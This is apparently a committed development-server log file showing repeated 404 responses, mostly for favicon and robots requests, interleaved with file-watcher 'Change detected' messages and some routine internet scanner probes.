+[0mGET /favicon.ico [33m404 [0m0.612 ms - 150[0m
+[36mChange detected[39m /home/visrvadmin/dev/fileServer/client/nohup.out
+[0mHEAD /robots.txt [33m404 [0m0.778 ms - 150[0m
+[36mChange detected[39m /home/visrvadmin/dev/fileServer/client/nohup.out
+[0mGET /favicon.ico [33m404 [0m0.532 ms - 150[0m
+[36mChange detected[39m /home/visrvadmin/dev/fileServer/client/nohup.out
+[0mGET /robots.txt [33m404 [0m1.119 ms - 149[0m
+[36mChange detected[39m /home/visrvadmin/dev/fileServer/client/nohup.out
+[0mGET /robots.txt [33m404 [0m0.915 ms - 149[0m
+[36mChange detected[39m /home/visrvadmin/dev/fileServer/client/nohup.out
+[0mGET /index.do [33m404 [0m0.421 ms - 147[0m
+[36mChange detected[39m /home/visrvadmin/dev/fileServer/client/nohup.out
+[0mGET /index.action [33m404 [0m0.384 ms - 151[0m
+[36mChange detected[39m /home/visrvadmin/dev/fileServer/client/nohup.out
+[0mGET /index.jsp [33m404 [0m0.333 ms - 148[0m
+[36mChange detected[39m /home/visrvadmin/dev/fileServer/client/nohup.out
+[0mGET /login.do [33m404 [0m0.348 ms - 147[0m
+[36mChange detected[39m /home/visrvadmin/dev/fileServer/client/nohup.out
+[0mGET /login.action [33m404 [0m0.344 ms - 151[0m
+[36mChange detected[39m /home/visrvadmin/dev/fileServer/client/nohup.out
+[0mGET /login.jsp [33m404 [0m0.284 ms - 148[0m
+[36mChange detected[39m /home/visrvadmin/dev/fileServer/client/nohup.out
+[0mGET /main.jsp [33m404 [0m0.411 ms - 147[0m
+[36mChange detected[39m /home/visrvadmin/dev/fileServer/client/nohup.out
+[0mGET /login/login.jsp [33m404 [0m0.398 ms - 154[0m
+[36mChange detected[39m /home/visrvadmin/dev/fileServer/client/nohup.out
+[0mGET /register.jsp [33m404 [0m0.898 ms - 151[0m
+[36mChange detected[39m /home/visrvadmin/dev/fileServer/client/nohup.out
+[0mGET /robots.txt [33m404 [0m0.777 ms - 149[0m
+[36mChange detected[39m /home/visrvadmin/dev/fileServer/client/nohup.out
+[0mGET /favicon.ico [33m404 [0m0.406 ms - 150[0m
+[36mChange detected[39m /home/visrvadmin/dev/fileServer/client/nohup.out
+[0mGET /favicon.ico [33m404 [0m0.630 ms - 150[0m
+[36mChange detected[39m /home/visrvadmin/dev/fileServer/client/nohup.out
+[0mGET /favicon.ico [33m404 [0m0.377 ms - 150[0m
+[36mChange detected[39m /home/visrvadmin/dev/fileServer/client/nohup.out
+[0mGET /favicon.ico [33m404 [0m0.634 ms - 150[0m
+[36mChange detected[39m /home/visrvadmin/dev/fileServer/client/nohup.out
+[0mGET /favicon.ico [33m404 [0m0.522 ms - 150[0m
+[36mChange detected[39m /home/visrvadmin/dev/fileServer/client/nohup.out
+[0mGET /favicon.ico [33m404 [0m0.514 ms - 150[0m
+[36mChange detected[39m /home/visrvadmin/dev/fileServer/client/nohup.out
+[0mGET /favicon.ico [33m404 [0m0.304 ms - 150[0m
+[36mChange detected[39m /home/visrvadmin/dev/fileServer/client/nohup.out
+[0mGET /favicon.ico [33m404 [0m0.471 ms - 150[0m
+[36mChange detected[39m /home/visrvadmin/dev/fileServer/client/nohup.out
+[0mGET /robots.txt [33m404 [0m0.838 ms - 149[0m
+[36mChange detected[39m /home/visrvadmin/dev/fileServer/client/nohup.out
+[0mGET /favicon.ico [33m404 [0m0.539 ms - 150[0m
+[36mChange detected[39m /home/visrvadmin/dev/fileServer/client/nohup.out
+[0mGET /favicon.ico [33m404 [0m0.506 ms - 150[0m
+[36mChange detected[39m /home/visrvadmin/dev/fileServer/client/nohup.out
+[0mGET /favicon.ico [33m404 [0m0.473 ms - 150[0m
+[36mChange detected[39m /home/visrvadmin/dev/fileServer/client/nohup.out
+[0mGET /favicon.ico [33m404 [0m0.416 ms - 150[0m
+[36mChange detected[39m /home/visrvadmin/dev/fileServer/client/nohup.out
+[0mGET /favicon.ico [33m404 [0m0.428 ms - 150[0m
+[36mChange detected[39m /home/visrvadmin/dev/fileServer/client/nohup.out
+[0mGET /favicon.ico [33m404 [0m0.474 ms - 150[0m
+[36mChange detected[39m /home/visrvadmin/dev/fileServer/client/nohup.out
+[0mGET /favicon.ico [33m404 [0m0.611 ms - 150[0m
+[36mChange detected[39m /home/visrvadmin/dev/fileServer/client/nohup.out
+[0mGET /robots.txt [33m404 [0m0.639 ms - 149[0m
+[36mChange detected[39m /home/visrvadmin/dev/fileServer/client/nohup.out
+[0mGET /favicon.ico [33m404 [0m0.583 ms - 150[0m
+[36mChange detected[39m /home/visrvadmin/dev/fileServer/client/nohup.out
+[0mGET /favicon.ico [33m404 [0m0.482 ms - 150[0m
+[36mChange detected[39m /home/visrvadmin/dev/fileServer/client/nohup.out
+[0mGET /favicon.ico [33m404 [0m0.512 ms - 150[0m
+[36mChange detected[39m /home/visrvadmin/dev/fileServer/client/nohup.out
+[0mGET /Telerik.Web.UI.WebResource.axd?type=rau [33m404 [0m1.313 ms - 169[0m
+[36mChange detected[39m /home/visrvadmin/dev/fileServer/client/nohup.out
+[0mGET /favicon.ico [33m404 [0m0.429 ms - 150[0m
+[36mChange detected[39m /home/visrvadmin/dev/fileServer/client/nohup.out
+[0mGET /favicon.ico [33m404 [0m0.473 ms - 150[0m
+[36mChange detected[39m /home/visrvadmin/dev/fileServer/client/nohup.out
+[0mGET /favicon.ico [33m404 [0m0.482 ms - 150[0m
+[36mChange detected[39m /home/visrvadmin/dev/fileServer/client/nohup.out
+[0mGET /favicon.ico [33m404 [0m0.435 ms - 150[0m
+[36mChange detected[39m /home/visrvadmin/dev/fileServer/client/nohup.out
+[0mGET /favicon.ico [33m404 [0m0.592 ms - 150[0m
+[36mChange detected[39m /home/visrvadmin/dev/fileServer/client/nohup.out
+[0mGET /favicon.ico [33m404 [0m0.537 ms - 150[0m
+[36mChange detected[39m /home/visrvadmin/dev/fileServer/client/nohup.out
+[0mGET /robots.txt [33m404 [0m0.836 ms - 149[0m
+[36mChange detected[39m /home/visrvadmin/dev/fileServer/client/nohup.out
+[0mGET /favicon.ico [33m404 [0m0.469 ms - 150[0m
+[36mChange detected[39m /home/visrvadmin/dev/fileServer/client/nohup.out
+[0mGET /robots.txt [33m404 [0m0.705 ms - 149[0m
+[36mChange detected[39m /home/visrvadmin/dev/fileServer/client/nohup.out
+[0mGET http://163.172.88.110:41298/1.txt [33m404 [0m0.945 ms - 144[0m
+[36mChange detected[39m /home/visrvadmin/dev/fileServer/client/nohup.out
+[0mGET http://163.172.88.110:41298/1.txt [33m404 [0m0.307 ms - 144[0m
+[0mGET http://163.172.88.110:41298/1.txt [33m404 [0m0.271 ms - 144[0m
+[36mChange detected[39m /home/visrvadmin/dev/fileServer/client/nohup.out
+[0mGET http://163.172.88.110:41298/1.txt [33m404 [0m0.304 ms - 144[0m
+[0mGET http://163.172.88.110:41298/1.txt [33m404 [0m0.355 ms - 144[0m
+[36mChange detected[39m /home/visrvadmin/dev/fileServer/client/nohup.out
+[0mGET http://163.172.88.110:41298/1.txt [33m404 [0m0.278 ms - 144[0m
+[0mGET /favicon.ico [33m404 [0m0.498 ms - 150[0m
+[36mChange detected[39m /home/visrvadmin/dev/fileServer/client/nohup.out
+[0mGET /favicon.ico [33m404 [0m0.489 ms - 150[0m
+[36mChange detected[39m /home/visrvadmin/dev/fileServer/client/nohup.out
+[0mGET /favicon.ico [33m404 [0m0.346 ms - 150[0m
+[36mChange detected[39m /home/visrvadmin/dev/fileServer/client/nohup.out
+[0mGET http://163.172.88.110:41298/1.txt [33m404 [0m0.802 ms - 144[0m
+[36mChange detected[39m /home/visrvadmin/dev/fileServer/client/nohup.out
+[0mGET http://163.172.88.110:41298/1.txt [33m404 [0m0.286 ms - 144[0m
+[36mChange detected[39m /home/visrvadmin/dev/fileServer/client/nohup.out
+[0mGET http://163.172.88.110:41298/1.txt [33m404 [0m0.358 ms - 144[0m
+[36mChange detected[39m /home/visrvadmin/dev/fileServer/client/nohup.out
+[0mGET /favicon.ico [33m404 [0m0.443 ms - 150[0m
+[36mChange detected[39m /home/visrvadmin/dev/fileServer/client/nohup.out
+[0mGET /favicon.ico [33m404 [0m0.533 ms - 150[0m
+[36mChange detected[39m /home/visrvadmin/dev/fileServer/client/nohup.out
+[0mGET /favicon.ico [33m404 [0m0.469 ms - 150[0m
+[36mChange detected[39m /home/visrvadmin/dev/fileServer/client/nohup.out
+[0mGET http://91.199.118.137:12542/19gtaf/1.txt [33m404 [0m0.781 ms - 151[0m
+[36mChange detected[39m /home/visrvadmin/dev/fileServer/client/nohup.out
+[0mGET http://91.199.118.137:12542/19gtaf/1.txt [33m404 [0m0.438 ms - 151[0m
+[36mChange detected[39m /home/visrvadmin/dev/fileServer/client/nohup.out
+[0mGET http://91.199.118.137:12542/19gtaf/1.txt [33m404 [0m0.413 ms - 151[0m
+[36mChange detected[39m /home/visrvadmin/dev/fileServer/client/nohup.out
+[0mGET /robots.txt [33m404 [0m0.915 ms - 149[0m
+[36mChange detected[39m /home/visrvadmin/dev/fileServer/client/nohup.out
+[0mGET /favicon.ico [33m404 [0m0.605 ms - 150[0m
+[36mChange detected[39m /home/visrvadmin/dev/fileServer/client/nohup.out
+[0mGET /favicon.ico [33m404 [0m0.403 ms - 150[0m
+[36mChange detected[39m /home/visrvadmin/dev/fileServer/client/nohup.out
+[0mGET /Telerik.Web.UI.WebResource.axd?type=rau [33m404 [0m1.218 ms - 169[0m
+[36mChange detected[39m /home/visrvadmin/dev/fileServer/client/nohup.out
+[0mGET /robots.txt [33m404 [0m1.022 ms - 149[0m
+[36mChange detected[39m /home/visrvadmin/dev/fileServer/client/nohup.out
+[0mGET /favicon.ico [33m404 [0m0.581 ms - 150[0m
+[36mChange detected[39m /home/visrvadmin/dev/fileServer/client/nohup.out
+[0mGET /robots.txt [33m404 [0m1.247 ms - 149[0m
+[36mChange detected[39m /home/visrvadmin/dev/fileServer/client/nohup.out
+[0mGET /favicon.ico [33m404 [0m0.476 ms - 150[0m
+[36mChange detected[39m /home/visrvadmin/dev/fileServer/client/nohup.out
+[0mGET /favicon.ico [33m404 [0m0.551 ms - 150[0m
+[36mChange detected[39m /home/visrvadmin/dev/fileServer/client/nohup.out
+[0mGET /robots.txt [33m404 [0m0.782 ms - 149[0m
+[36mChange detected[39m /home/visrvadmin/dev/fileServer/client/nohup.out
+[0mGET /favicon.ico [33m404 [0m0.408 ms - 150[0m
+[36mChange detected[39m /home/visrvadmin/dev/fileServer/client/nohup.out
+[0mGET /favicon.ico [33m404 [0m0.380 ms - 150[0m
+[36mChange detected[39m /home/visrvadmin/dev/fileServer/client/nohup.out
+[0mGET /favicon.ico [33m404 [0m0.520 ms - 150[0m
+[36mChange detected[39m /home/visrvadmin/dev/fileServer/client/nohup.out
+[0mGET /favicon.ico [33m404 [0m0.476 ms - 150[0m
+[36mChange detected[39m /home/visrvadmin/dev/fileServer/client/nohup.out
+[0mGET /nice%20ports%2C/Tri%6Eity.txt%2ebak [33m404 [0m0.495 ms - 174[0m
+[36mChange detected[39m /home/visrvadmin/dev/fileServer/client/nohup.out
+[0mGET /favicon.ico [33m404 [0m0.438 ms - 150[0m
+[36mChange detected[39m /home/visrvadmin/dev/fileServer/client/nohup.out
+[0mGET /favicon.ico [33m404 [0m0.414 ms - 150[0m
+[36mChange detected[39m /home/visrvadmin/dev/fileServer/client/nohup.out
+[0mGET /favicon.ico [33m404 [0m0.433 ms - 150[0m
+[36mChange detected[39m /home/visrvadmin/dev/fileServer/client/nohup.out
+[0mGET /favicon.ico [33m404 [0m0.399 ms - 150[0m
+[36mChange detected[39m /home/visrvadmin/dev/fileServer/client/nohup.out
+[0mGET /favicon.ico [33m404 [0m4.347 ms - 150[0m
+[36mChange detected[39m /home/visrvadmin/dev/fileServer/client/nohup.out
+[0mGET /favicon.ico [33m404 [0m0.549 ms - 150[0m
+[36mChange detected[39m /home/visrvadmin/dev/fileServer/client/nohup.out
+[0mGET /favicon.ico [33m404 [0m0.469 ms - 150[0m
+[36mChange detected[39m /home/visrvadmin/dev/fileServer/client/nohup.out
+[0mGET /favicon.ico [33m404 [0m0.450 ms - 150[0m
+[36mChange detected[39m /home/visrvadmin/dev/fileServer/client/nohup.out
+[0mGET /favicon.ico [33m404 [0m0.439 ms - 150[0m
+[36mChange detected[39m /home/visrvadmin/dev/fileServer/client/nohup.out
+[0mGET /Telerik.Web.UI.WebResource.axd?type=rau [33m404 [0m1.027 ms - 169[0m
+[36mChange detected[39m /home/visrvadmin/dev/fileServer/client/nohup.out
+[0mGET /favicon.ico [33m404 [0m0.506 ms - 150[0m
+[36mChange detected[39m /home/visrvadmin/dev/fileServer/client/nohup.out
+[0mGET /favicon.ico [33m404 [0m0.431 ms - 150[0m
+[36mChange detected[39m /home/visrvadmin/dev/fileServer/client/nohup.out
+[0mGET /.gitignore [33m404 [0m15.916 ms - 149[0m
+[36mChange detected[39m /home/visrvadmin/dev/fileServer/client/nohup.out
+[0mGET /favicon.ico [33m404 [0m0.505 ms - 150[0m
+[36mChange detected[39m /home/visrvadmin/dev/fileServer/client/nohup.out
+[0mGET /system_api.php [33m404 [0m0.407 ms - 153[0m
+[36mChange detected[39m /home/visrvadmin/dev/fileServer/client/nohup.out
+[0mGET /c/version.js [33m404 [0m0.374 ms - 151[0m
+[36mChange detected[39m /home/visrvadmin/dev/fileServer/client/nohup.out
+[0mGET /streaming/clients_live.php [33m404 [0m0.410 ms - 165[0m
+[36mChange detected[39m /home/visrvadmin/dev/fileServer/client/nohup.out
+[0mGET /stalker_portal/c/version.js [33m404 [0m0.476 ms - 166[0m
+[36mChange detected[39m /home/visrvadmin/dev/fileServer/client/nohup.out
+[0mGET /client_area/ [33m404 [0m0.378 ms - 151[0m
+[36mChange detected[39m /home/visrvadmin/dev/fileServer/client/nohup.out
+[0mGET /stalker_portal/c/ [33m404 [0m0.381 ms - 156[0m
+[36mChange detected[39m /home/visrvadmin/dev/fileServer/client/nohup.out
+[0mGET /favicon.ico [33m404 [0m0.502 ms - 150[0m
+[36mChange detected[39m /home/visrvadmin/dev/fileServer/client/nohup.out
+[0mGET /favicon.ico [33m404 [0m0.495 ms - 150[0m
+[36mChange detected[39m /home/visrvadmin/dev/fileServer/client/nohup.out
+[0mGET /favicon.ico [33m404 [0m0.398 ms - 150[0m
+[36mChange detected[39m /home/visrvadmin/dev/fileServer/client/nohup.out
+[0mGET /favicon.ico [33m404 [0m0.553 ms - 150[0m
+[36mChange detected[39m /home/visrvadmin/dev/fileServer/client/nohup.out
+[0mGET /favicon.ico [33m404 [0m0.375 ms - 150[0m
+[36mChange detected[39m /home/visrvadmin/dev/fileServer/client/nohup.out
+[0mGET /favicon.ico [33m404 [0m0.421 ms - 150[0m
+[36mChange detected[39m /home/visrvadmin/dev/fileServer/client/nohup.out
+[0mGET /favicon.ico [33m404 [0m0.398 ms - 150[0m
+[36mChange detected[39m /home/visrvadmin/dev/fileServer/client/nohup.out
+[0mGET /favicon.ico [33m404 [0m0.402 ms - 150[0m
+[36mChange detected[39m /home/visrvadmin/dev/fileServer/client/nohup.out
+[0mGET /favicon.ico [33m404 [0m0.731 ms - 150[0m
+[36mChange detected[39m /home/visrvadmin/dev/fileServer/client/nohup.out
+[0mGET /favicon.ico [33m404 [0m0.370 ms - 150[0m
+[36mChange detected[39m /home/visrvadmin/dev/fileServer/client/nohup.out
+[0mGET /favicon.ico [33m404 [0m0.454 ms - 150[0m
+[36mChange detected[39m /home/visrvadmin/dev/fileServer/client/nohup.out
+[0mGET /favicon.ico [33m404 [0m0.281 ms - 150[0m
+[36mChange detected[39m /home/visrvadmin/dev/fileServer/client/nohup.out
+[0mGET /favicon.ico [33m404 [0m0.479 ms - 150[0m
+[36mChange detected[39m /home/visrvadmin/dev/fileServer/client/nohup.out
+[0mGET /favicon.ico [33m404 [0m0.441 ms - 150[0m
+[36mChange detected[39m /home/visrvadmin/dev/fileServer/client/nohup.out
+[0mGET /robots.txt [33m404 [0m0.391 ms - 149[0m
+[36mChange detected[39m /home/visrvadmin/dev/fileServer/client/nohup.out
+[0mGET /sitemap.xml [33m404 [0m0.382 ms - 150[0m
+[36mChange detected[39m /home/visrvadmin/dev/fileServer/client/nohup.out
+[0mHEAD /robots.txt [33m404 [0m0.711 ms - 150[0m
+[36mChange detected[39m /home/visrvadmin/dev/fileServer/client/nohup.out
+[0mGET /favicon.ico [33m404 [0m0.539 ms - 150[0m
+[36mChange detected[39m /home/visrvadmin/dev/fileServer/client/nohup.out
+[0mGET /favicon.ico [33m404 [0m0.357 ms - 150[0m
+[36mChange detected[39m /home/visrvadmin/dev/fileServer/client/nohup.out
+[0mGET /favicon.ico [33m404 [0m0.403 ms - 150[0m
+[36mChange detected[39m /home/visrvadmin/dev/fileServer/client/nohup.out
+[0mGET /favicon.ico [33m404 [0m0.540 ms - 150[0m
+[36mChange detected[39m /home/visrvadmin/dev/fileServer/client/nohup.out
+[0mGET /favicon.ico [33m404 [0m0.492 ms - 150[0m
+[36mChange detected[39m /home/visrvadmin/dev/fileServer/client/nohup.out
+[0mGET /favicon.ico [33m404 [0m0.352 ms - 150[0m
+[36mChange detected[39m /home/visrvadmin/dev/fileServer/client/nohup.out
+[0mGET /favicon.ico [33m404 [0m0.500 ms - 150[0m
+[36mChange detected[39m /home/visrvadmin/dev/fileServer/client/nohup.out
+[0mGET /favicon.ico [33m404 [0m0.665 ms - 150[0m
+[36mChange detected[39m /home/visrvadmin/dev/fileServer/client/nohup.out
+[0mGET /favicon.ico [33m404 [0m0.508 ms - 150[0m
+[36mChange detected[39m /home/visrvadmin/dev/fileServer/client/nohup.out
+[0mGET /favicon.ico [33m404 [0m0.418 ms - 150[0m
+[36mChange detected[39m /home/visrvadmin/dev/fileServer/client/nohup.out
+[0mGET /favicon.ico [33m404 [0m0.453 ms - 150[0m
+[36mChange detected[39m /home/visrvadmin/dev/fileServer/client/nohup.out
+[0mGET /favicon.ico [33m404 [0m0.359 ms - 150[0m
+[36mChange detected[39m /home/visrvadmin/dev/fileServer/client/nohup.out
+[0mGET /favicon.ico [33m404 [0m0.401 ms - 150[0m
+[36mChange detected[39m /home/visrvadmin/dev/fileServer/client/nohup.out
+[0mGET /favicon.ico [33m404 [0m1.573 ms - 150[0m
+[36mChange detected[39m /home/visrvadmin/dev/fileServer/client/nohup.out
+[0mGET /favicon.ico [33m404 [0m0.463 ms - 150[0m
+[36mChange detected[39m /home/visrvadmin/dev/fileServer/client/nohup.out
+[0mGET /js/main.js [33m404 [0m0.314 ms - 149[0m
+[36mChange detected[39m /home/visrvadmin/dev/fileServer/client/nohup.out
+[0mGET /img/foto-profile-1.png [33m404 [0m0.703 ms - 161[0m
+[36mChange detected[39m /home/visrvadmin/dev/fileServer/client/nohup.out
+[0mGET /js/main.js [33m404 [0m0.258 ms - 149[0m
+[36mChange detected[39m /home/visrvadmin/dev/fileServer/client/nohup.out
+[0mGET /fonts/icomoon.ttf?rds5r6 [33m404 [0m0.302 ms - 156[0m
+[0mGET /fonts/icomoon.woff?rds5r6 [33m404 [0m0.360 ms - 157[0m
+[36mChange detected[39m /home/visrvadmin/dev/fileServer/client/nohup.out
+[0mGET /img/captcha.jpg [33m404 [0m0.416 ms - 154[0m
+[36mChange detected[39m /home/visrvadmin/dev/fileServer/client/nohup.out
+[0mGET /js/main.js [33m404 [0m0.264 ms - 149[0m
+[36mChange detected[39m /home/visrvadmin/dev/fileServer/client/nohup.out
+[0mGET /fonts/icomoon.ttf?rds5r6 [33m404 [0m0.321 ms - 156[0m
+[36mChange detected[39m /home/visrvadmin/dev/fileServer/client/nohup.out
+[0mGET /js/main.js [33m404 [0m0.268 ms - 149[0m
+[0mGET /fonts/icomoon.woff?rds5r6 [33m404 [0m0.396 ms - 157[0m
+[36mChange detected[39m /home/visrvadmin/dev/fileServer/client/nohup.out
+[0mGET /js/main.js [33m404 [0m1.323 ms - 149[0m
+[0mGET /img/foto-user-1.png [33m404 [0m1.491 ms - 158[0m
+[36mChange detected[39m /home/visrvadmin/dev/fileServer/client/nohup.out
+[0mGET /img/foto-profile-1.png [33m404 [0m0.372 ms - 161[0m
+[36mChange detected[39m /home/visrvadmin/dev/fileServer/client/nohup.out
+[0mGET /img/foto-user-2.png [33m404 [0m0.295 ms - 158[0m
+[0mGET /fonts/icomoon.ttf?rds5r6 [33m404 [0m0.294 ms - 156[0m
+[36mChange detected[39m /home/visrvadmin/dev/fileServer/client/nohup.out
+[0mGET /fonts/icomoon.woff?rds5r6 [33m404 [0m0.269 ms - 157[0m
+[36mChange detected[39m /home/visrvadmin/dev/fileServer/client/nohup.out
+[0mGET /favicon.ico [33m404 [0m5.126 ms - 150[0m
+[36mChange detected[39m /home/visrvadmin/dev/fileServer/client/nohup.out
+[0mGET /favicon.ico [33m404 [0m0.383 ms - 150[0m
+[36mChange detected[39m /home/visrvadmin/dev/fileServer/client/nohup.out
+[0mGET /favicon.ico [33m404 [0m0.472 ms - 150[0m
+[36mChange detected[39m /home/visrvadmin/dev/fileServer/client/nohup.out
+[0mGET /favicon.ico [33m404 [0m0.483 ms - 150[0m
+[36mChange detected[39m /home/visrvadmin/dev/fileServer/client/nohup.out
+[0mGET /favicon.ico [33m404 [0m0.432 ms - 150[0m
+[36mChange detected[39m /home/visrvadmin/dev/fileServer/client/nohup.out
+[0mGET /favicon.ico [33m404 [0m0.418 ms - 150[0m
+[36mChange detected[39m /home/visrvadmin/dev/fileServer/client/nohup.out
+[0mGET /favicon.ico [33m404 [0m0.348 ms - 150[0m
+[36mChange detected[39m /home/visrvadmin/dev/fileServer/client/nohup.out
+[0mGET /favicon.ico [33m404 [0m0.431 ms - 150[0m
+[36mChange detected[39m /home/visrvadmin/dev/fileServer/client/nohup.out
+[0mGET /favicon.ico [33m404 [0m0.473 ms - 150[0m
+[36mChange detected[39m /home/visrvadmin/dev/fileServer/client/nohup.out
+[0mGET /favicon.ico [33m404 [0m0.488 ms - 150[0m
+[36mChange detected[39m /home/visrvadmin/dev/fileServer/client/nohup.out
+[0mGET /favicon.ico [33m404 [0m0.495 ms - 150[0m
+[36mChange detected[39m /home/visrvadmin/dev/fileServer/client/nohup.out
+[0mGET /favicon.ico [33m404 [0m0.463 ms - 150[0m
+[36mChange detected[39m /home/visrvadmin/dev/fileServer/client/nohup.out
+[0mHEAD /robots.txt [33m404 [0m0.815 ms - 150[0m
+[36mChange detected[39m /home/visrvadmin/dev/fileServer/client/nohup.out
+[0mGET /favicon.ico [33m404 [0m1.622 ms - 150[0m
+[36mChange detected[39m /home/visrvadmin/dev/fileServer/client/nohup.out
+[0mGET /favicon.ico [33m404 [0m0.454 ms - 150[0m
+[36mChange detected[39m /home/visrvadmin/dev/fileServer/client/nohup.out
+[0mPOST / [33m405 [0m0.041 ms - 0[0m
+[36mChange detected[39m /home/visrvadmin/dev/fileServer/client/nohup.out
+[0mGET /robots.txt [33m404 [0m0.345 ms - 149[0m
+[36mChange detected[39m /home/visrvadmin/dev/fileServer/client/nohup.out
+[0mGET /system_api.php [33m404 [0m4.728 ms - 153[0m
+[36mChange detected[39m /home/visrvadmin/dev/fileServer/client/nohup.out
+[0mGET /c/version.js [33m404 [0m0.381 ms - 151[0m
+[36mChange detected[39m /home/visrvadmin/dev/fileServer/client/nohup.out
+[0mGET /streaming/clients_live.php [33m404 [0m0.495 ms - 165[0m
+[36mChange detected[39m /home/visrvadmin/dev/fileServer/client/nohup.out
+[0mGET /stalker_portal/c/version.js [33m404 [0m0.501 ms - 166[0m
+[36mChange detected[39m /home/visrvadmin/dev/fileServer/client/nohup.out
+[0mGET /client_area/ [33m404 [0m0.367 ms - 151[0m
+[36mChange detected[39m /home/visrvadmin/dev/fileServer/client/nohup.out
+[0mGET /stalker_portal/c/ [33m404 [0m0.378 ms - 156[0m
+[36mChange detected[39m /home/visrvadmin/dev/fileServer/client/nohup.out
+[0mGET /favicon.ico [33m404 [0m0.471 ms - 150[0m
+[36mChange detected[39m /home/visrvadmin/dev/fileServer/client/nohup.out
+[0mGET /favicon.ico [33m404 [0m0.443 ms - 150[0m
+[36mChange detected[39m /home/visrvadmin/dev/fileServer/client/nohup.out
+[36mChange detected[39m /home/visrvadmin/dev/fileServer/client/nohup.out
+[0mGET /favicon.ico [33m404 [0m0.476 ms - 150[0m
+[36mChange detected[39m /home/visrvadmin/dev/fileServer/client/nohup.out
+[0mGET /favicon.ico [33m404 [0m0.466 ms - 150[0m
+[36mChange detected[39m /home/visrvadmin/dev/fileServer/client/nohup.out
+[0mGET /favicon.ico [33m404 [0m0.436 ms - 150[0m
+[36mChange detected[39m /home/visrvadmin/dev/fileServer/client/nohup.out
+[0mGET /favicon.ico [33m404 [0m0.544 ms - 150[0m
+[36mChange detected[39m /home/visrvadmin/dev/fileServer/client/nohup.out
+[0mGET /favicon.ico [33m404 [0m0.535 ms - 150[0m
+[36mChange detected[39m /home/visrvadmin/dev/fileServer/client/nohup.out
+[0mGET /favicon.ico [33m404 [0m0.510 ms - 150[0m
+[36mChange detected[39m /home/visrvadmin/dev/fileServer/client/nohup.out
+[0mGET /favicon.ico [33m404 [0m0.508 ms - 150[0m
+[36mChange detected[39m /home/visrvadmin/dev/fileServer/client/nohup.out
+[0mHEAD /robots.txt [33m404 [0m0.718 ms - 150[0m
+[36mChange detected[39m /home/visrvadmin/dev/fileServer/client/nohup.out
+[0mGET /favicon.ico [33m404 [0m0.465 ms - 150[0m
+[36mChange detected[39m /home/visrvadmin/dev/fileServer/client/nohup.out
+[0mGET /favicon.ico [33m404 [0m47.812 ms - 150[0m
+[36mChange detected[39m /home/visrvadmin/dev/fileServer/client/nohup.out
+[0mGET /favicon.ico [33m404 [0m0.891 ms - 150[0m
+[36mChange detected[39m /home/visrvadmin/dev/fileServer/client/nohup.out
+[0mGET /favicon.ico [33m404 [0m0.486 ms - 150[0m
+[36mChange detected[39m /home/visrvadmin/dev/fileServer/client/nohup.out
+[0mGET /system_api.php [33m404 [0m0.434 ms - 153[0m
+[36mChange detected[39m /home/visrvadmin/dev/fileServer/client/nohup.out
+[0mGET /c/version.js [33m404 [0m1.347 ms - 151[0m
+[36mChange detected[39m /home/visrvadmin/dev/fileServer/client/nohup.out
+[0mGET /streaming/clients_live.php [33m404 [0m0.487 ms - 165[0m
+[36mChange detected[39m /home/visrvadmin/dev/fileServer/client/nohup.out
+[0mGET /stalker_portal/c/version.js [33m404 [0m0.398 ms - 166[0m
+[36mChange detected[39m /home/visrvadmin/dev/fileServer/client/nohup.out
+[0mGET /client_area/ [33m404 [0m0.402 ms - 151[0m
+[36mChange detected[39m /home/visrvadmin/dev/fileServer/client/nohup.out
+[0mGET /stalker_portal/c/ [33m404 [0m0.397 ms - 156[0m
+[36mChange detected[39m /home/visrvadmin/dev/fileServer/client/nohup.out
+[0mGET /HNAP1/ [33m404 [0m1.120 ms - 145[0m
+[36mChange detected[39m /home/visrvadmin/dev/fileServer/client/nohup.out
+[0mGET /favicon.ico [33m404 [0m62.526 ms - 150[0m
+[36mChange detected[39m /home/visrvadmin/dev/fileServer/client/nohup.out
+[0mGET /favicon.ico [33m404 [0m0.450 ms - 150[0m
+[36mChange detected[39m /home/visrvadmin/dev/fileServer/client/nohup.out
+[0mGET /favicon.ico [33m404 [0m0.470 ms - 150[0m
+[36mChange detected[39m /home/visrvadmin/dev/fileServer/client/nohup.out
+[0mGET /favicon.ico [33m404 [0m41.069 ms - 150[0m
+[36mChange detected[39m /home/visrvadmin/dev/fileServer/client/nohup.out
+[0mGET /favicon.ico [33m404 [0m0.434 ms - 150[0m
+[36mChange detected[39m /home/visrvadmin/dev/fileServer/client/nohup.out
+[36mChange detected[39m /home/visrvadmin/dev/fileServer/client/nohup.out
+[0mGET /favicon.ico [33m404 [0m0.469 ms - 150[0m
+[36mChange detected[39m /home/visrvadmin/dev/fileServer/client/nohup.out
+[0mGET /favicon.ico [33m404 [0m0.399 ms - 150[0m
+[36mChange detected[39m /home/visrvadmin/dev/fileServer/client/nohup.out
+[0mGET /favicon.ico [33m404 [0m0.395 ms - 150[0m
+[36mChange detected[39m /home/visrvadmin/dev/fileServer/client/nohup.out
+[0mGET /favicon.ico [33m404 [0m0.427 ms - 150[0m
+[36mChange detected[39m /home/visrvadmin/dev/fileServer/client/nohup.out
+[0mGET /system_api.php [33m404 [0m0.402 ms - 153[0m
+[36mChange detected[39m /home/visrvadmin/dev/fileServer/client/nohup.out
+[0mGET /c/version.js [33m404 [0m0.382 ms - 151[0m
+[36mChange detected[39m /home/visrvadmin/dev/fileServer/client/nohup.out
+[0mGET /streaming/clients_live.php [33m404 [0m0.369 ms - 165[0m
+[36mChange detected[39m /home/visrvadmin/dev/fileServer/client/nohup.out
+[0mGET /stalker_portal/c/version.js [33m404 [0m0.380 ms - 166[0m
+[36mChange detected[39m /home/visrvadmin/dev/fileServer/client/nohup.out
+[0mGET /client_area/ [33m404 [0m0.385 ms - 151[0m
+[36mChange detected[39m /home/visrvadmin/dev/fileServer/client/nohup.out
+[0mGET /stalker_portal/c/ [33m404 [0m0.394 ms - 156[0m
+[36mChange detected[39m /home/visrvadmin/dev/fileServer/client/nohup.out
+[36mChange detected[39m /home/visrvadmin/dev/fileServer/client/fileServerFront.zip.back.3
+[36mChange detected[39m /home/visrvadmin/dev/fileServer/client/fileServerFront.zip.back.2
+[36mChange detected[39m /home/visrvadmin/dev/fileServer/client/fileServerFront.zip.back.1
+[36mChange detected[39m /home/visrvadmin/dev/fileServer/client/nohup.out
+[0mGET /favicon.ico [33m404 [0m0.444 ms - 150[0m
+[36mChange detected[39m /home/visrvadmin/dev/fileServer/client/nohup.out
+[0mGET /favicon.ico [33m404 [0m0.431 ms - 150[0m
